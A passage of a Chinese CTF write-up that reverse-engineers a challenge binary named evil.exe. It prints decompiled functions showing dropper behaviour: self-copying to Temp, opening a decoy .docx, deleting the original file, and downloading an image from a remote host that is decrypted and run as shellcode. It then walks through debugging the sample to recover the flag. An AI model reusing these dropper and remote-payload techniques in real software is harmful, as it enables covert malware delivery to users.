D2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2019/06/14/5d032918c47dd94054.png" alt="Snipaste_2019-06-14_12-56-48.png"></p><blockquote><p>程序大致思路：</p></blockquote><blockquote><p>将evil.exe文件本身复制到temp文件夹中，并且创建evil.docx文件</p><p>之后执行temp文件夹中的evil.exe (initialization)</p><p>到这里程序会return 6，使得winmain函数跳出，本目录下的evil.exe执行完毕</p></blockquote><p><strong>如果想继续用ollydbg调试的话，需要在mov eax, 6 把 6改为5，以便让程序不要结束</strong></p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">signed</span> <span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_401370</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [esp+0h] [ebp-7BCh]</span></span><br><span class="line">  <span class="keyword">char</span> DstBuf; <span class="comment">// [esp+4h] [ebp-7B8h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [esp+21Ch] [ebp-5A0h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+264h] [ebp-558h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+370h] [ebp-44Ch]</span></span><br><span class="line">  <span class="keyword">char</span> Src; <span class="comment">// [esp+374h] [ebp-448h]</span></span><br><span class="line">  <span class="keyword">char</span> Dst; <span class="comment">// [esp+47Ch] [ebp-340h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+588h] [ebp-234h]</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// [esp+58Ch] [ebp-230h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v11; <span class="comment">// [esp+59Ch] [ebp-220h]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [esp+5A0h] [ebp-21Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v13; <span class="comment">// [esp+5A4h] [ebp-218h]</span></span><br><span class="line">  CHAR File; <span class="comment">// [esp+6ACh] [ebp-110h]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  v11 = (*((<span class="keyword">int</span> (__stdcall **)(<span class="keyword">int</span>, <span class="keyword">char</span> *, <span class="keyword">signed</span> <span class="keyword">int</span>))&amp;byte_40B01C + <span class="number">6</span>))(a1, &amp;v13, <span class="number">261</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v11 &gt; <span class="number">0x105</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  v11 = (*((<span class="keyword">int</span> (__stdcall **)(<span class="keyword">signed</span> <span class="keyword">int</span>, <span class="keyword">char</span> *))&amp;byte_40B01C + <span class="number">5</span>))(<span class="number">261</span>, &amp;Dst);</span><br><span class="line">  <span class="keyword">if</span> ( v11 &gt; <span class="number">0x105</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">  _splitpath(&amp;v13, <span class="number">0</span>, &amp;File, &amp;Src, &amp;v5);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(&amp;v13, <span class="string">"\\Temp\\"</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">  strcat_s(&amp;Dst, <span class="number">0x105</span>u, &amp;Src);</span><br><span class="line">  <span class="keyword">if</span> ( v5 != <span class="number">46</span> )</span><br><span class="line">    strcat_s(&amp;Dst, <span class="number">0x105</span>u, <span class="string">"."</span>);</span><br><span class="line">  strcat_s(&amp;Dst, <span class="number">0x105</span>u, &amp;v5);</span><br><span class="line">  (*((<span class="keyword">void</span> (__stdcall **)(<span class="keyword">char</span> *, <span class="keyword">char</span> *, _DWORD))&amp;byte_40B01C + <span class="number">4</span>))(&amp;v13, &amp;Dst, <span class="number">0</span>);</span><br><span class="line">  strcat_s(&amp;File, <span class="number">0x105</span>u, &amp;Src);</span><br><span class="line">  strcat_s(&amp;File, <span class="number">0x105</span>u, <span class="string">".docx"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !sub_4012E0(<span class="number">101</span>, &amp;v6, &amp;v12) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">  v9 = (*((<span class="keyword">int</span> (__stdcall **)(CHAR *, <span class="keyword">signed</span> <span class="keyword">int</span>, <span class="keyword">signed</span> <span class="keyword">int</span>, _DWORD, <span class="keyword">signed</span> <span class="keyword">int</span>, <span class="keyword">signed</span> <span class="keyword">int</span>, _DWORD))&amp;byte_40B01C + <span class="number">3</span>))(</span><br><span class="line">         &amp;File,</span><br><span class="line">         <span class="number">0x40000000</span>,</span><br><span class="line">         <span class="number">1</span>,</span><br><span class="line">         <span class="number">0</span>,</span><br><span class="line">         <span class="number">2</span>,</span><br><span class="line">         <span class="number">128</span>,</span><br><span class="line">         <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v9 == <span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line">  (*((<span class="keyword">void</span> (__stdcall **)(<span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">char</span> *, _DWORD))&amp;byte_40B01C + <span class="number">2</span>))(v9, v6, v12, &amp;v2, <span class="number">0</span>);</span><br><span class="line">  (*((<span class="keyword">void</span> (__stdcall **)(<span class="keyword">int</span>))&amp;byte_40B01C + <span class="number">1</span>))(v9);</span><br><span class="line">  sprintf_s(&amp;DstBuf, <span class="number">0x218</span>u, <span class="string">"%s \"%s\""</span>, &amp;Dst, &amp;v13);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v4, <span class="number">0</span>, <span class="number">0x44</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v10, <span class="number">0</span>, <span class="number">0x10</span>u);</span><br><span class="line">  v4 = <span class="number">68</span>;</span><br><span class="line">  byte_40B01C(<span class="number">0</span>, &amp;DstBuf, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, &amp;v4, &amp;v10);</span><br><span class="line">  ShellExecuteA(<span class="number">0</span>, <span class="string">"open"</span>, &amp;File, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">6</span>;              <span class="comment">// 只要是正常执行evil.exe文件，都会返回6，所以到这里调试一定会结束</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>temp目录下的evil.exe开始执行</p><p>循环删除当前目录下的evil.exe (sub_401620) 这就是为什么运行一次程序就消失了</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">LPWSTR *<span class="title">sub_401620</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> WCHAR *v0; <span class="comment">// eax</span></span><br><span class="line">  LPWSTR *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// ST08_4</span></span><br><span class="line">  <span class="keyword">int</span> pNumArgs; <span class="comment">// [esp+4h] [ebp-8h]</span></span><br><span class="line">  LPWSTR *v4; <span class="comment">// [esp+8h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v0 = (<span class="keyword">const</span> WCHAR *)(*((<span class="keyword">int</span> (**)(<span class="keyword">void</span>))&amp;byte_40B01C + <span class="number">9</span>))();</span><br><span class="line">  result = CommandLineToArgvW(v0, &amp;pNumArgs);</span><br><span class="line">  v4 = result;</span><br><span class="line">  <span class="keyword">if</span> ( result &amp;&amp; pNumArgs == <span class="number">2</span> )<span class="comment">//这个地方删除evil.exe文件</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = (*((<span class="keyword">int</span> (__stdcall **)(LPWSTR))&amp;byte_40B01C + <span class="number">8</span>))(v4[<span class="number">1</span>]);</span><br><span class="line">      result = (LPWSTR *)(*((<span class="keyword">int</span> (__stdcall **)(<span class="keyword">signed</span> <span class="keyword">int</span>))&amp;byte_40B01C + <span class="number">7</span>))(<span class="number">512</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( !v2 );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><a href="http://xn--www-8p9d.ddctf.com" target="_blank" rel="noopener">从www.ddctf.com</a></p><p>读取jpg文件（可以通过搭建http服务器解决，上篇文章写过了）</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> *__<span class="function">cdecl <span class="title">sub_4018F0</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+0h] [ebp-18h]</span></span><br><span class="line">  DWORD dwNumberOfBytesRead; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  BOOL v4; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">void</span> *v5; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line">  HINTERNET hFile; <span class="comment">// [esp+10h] [ebp-8h]</span></span><br><span class="line">  HINTERNET hInternet; <span class="comment">// [esp+14h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  dwNumberOfBytesRead = <span class="number">0</span>;</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  hInternet = InternetOpenA(<span class="string">"DDCTF"</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  hFile = InternetOpenUrlA(hInternet, <span class="string">"http://www.ddctf.com/x.jpg"</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x4000000</span>u, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !hFile )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="built_in">malloc</span>(<span class="number">0x100000</span>u);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v4 = InternetReadFile(hFile, (<span class="keyword">char</span> *)v5 + v2, <span class="number">0x100000</span> - v2, &amp;dwNumberOfBytesRead);</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v2 += dwNumberOfBytesRead;</span><br><span class="line">    <span class="keyword">if</span> ( !dwNumberOfBytesRead )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v2 &lt; <span class="number">0x100000</span> );</span><br><span class="line">  InternetCloseHandle(hFile);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0x100000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *a1 = v2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(v5);</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>进入dec1、dec2函数，将jpg文件解密</p><p>进入shell函数，在里面进行最后的解密，然后执行这个shell</p></blockquote><blockquote><p>关于ida的部分我就不贴了，因为这些指令主要是和汇编操作有关</p><p>这部分有两种解决方法</p><p>一种是调试，将解密的shellcode调试出来</p><p>另一种是计算，因为这是一个正向过程，很容易就能把解密函数的c代码复制下来，改改就能用了</p></blockquote><p>这里我是用的调试法</p><p>直接在0x401220下断点</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2019/06/14/5d032d50364d079722.png" alt="Snipaste_2019-06-14_12-56-48.png"></p><p>由于ida分析，拖黑的部分即为shellcode的最后解密代码，我们就把程序F4到那个地方</p><p>这里是才执行完for循环的位置，eax寄存器里面还保存有lpAddress的地址，我们直接Ctrl+g查看对应的内存</p><blockquote><p>果然出现了一段疑似flag的字符串，不过提交后发现答案不对，这是因为这段字符串不全是flag，这其实是一段shellcode，里面夹杂了汇编指令</p></blockquote><p>那个0x68应该就是push指令了</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2019/06/14/5d032df662d3879025.png" alt="Snipaste_2019-06-14_12-56-48.png"></p><blockquote><p>以下是失败的尝试，建议直接跳过</p></blockquote><p>本来跳转没有实现，但是为了执行call edx ，我再一次无耻地改了eip</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.loli.net/2019/06/14/5d032f1305cbf72967.png" alt="Snipaste_2019-06-14_12-56-48.png"></p><p>本以为可以成功跳转到对应的shellcode，然而我失败了，最终手输的flag</p><blockquote><p>贴一个其他师傅的成功截图，我反正是没成功调到那一步的，，，太菜了</p><p><a href="https://blog.csdn.net/getsum/article/details/87902382" target="_blank" rel="noopener">https://blog.csdn.net/getsum/article/details/87902382</a></p></blockquote><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2